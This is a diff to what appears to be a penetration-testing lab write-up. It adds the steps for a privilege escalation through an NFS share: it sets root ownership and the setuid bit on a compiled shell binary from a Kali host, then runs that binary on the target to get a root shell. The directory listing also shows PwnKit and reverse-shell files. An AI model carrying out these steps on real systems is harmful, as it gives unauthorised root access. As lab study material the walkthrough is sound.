@@ -544,9 +544,34 @@ int main() {
 ```
 
 - We can then compile the code and move it to /var/www/html so we can access it on the attacker machine
-- Finally we set the suid bit of the binary so it always runs as root
+- Finally we set the suid bit of the binary and change the owner to root so it always runs as root
 
+```
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ sudo chown root /mnt/nfs/var/www/html/shell                                                     
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ sudo chgrp root /mnt/nfs/var/www/html/shell
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ sudo chmod u+s /mnt/nfs/var/www/html/shell
 
+jennifer@srv-99-590:/var/www/html$ ls -l
+total 40
+-rw-r--r-- 1 www-data www-data  1267 Mar  6 15:43 cve-2021-4034-poc.c
+-rw-r--r-- 1 ubuntu   ubuntu    5489 Mar  6 15:14 exp.php
+-rw-r--r-- 1 root     root     11321 Mar  5 00:49 index.html
+-rw-r--r-- 1 www-data www-data     0 Mar  6 15:43 pwnkit.c
+-rw-r--r-- 1 ubuntu   ubuntu      74 Mar  6 15:11 rev.php
+-rwsrwxr-x 1 root     root      7388 Mar  6 17:11 shell
+-rw-rw-r-- 1 jennifer jennifer   124 Mar  6 17:11 shell.c
+```
+
+- Run the binary on the target machine and you will get a root shell
+```
+jennifer@srv-99-590:/var/www/html$ ./shell
+root@srv-99-590:/var/www/html# whoami
+root
+root@srv-99-590:/var/www/html#
+```
 
 
 
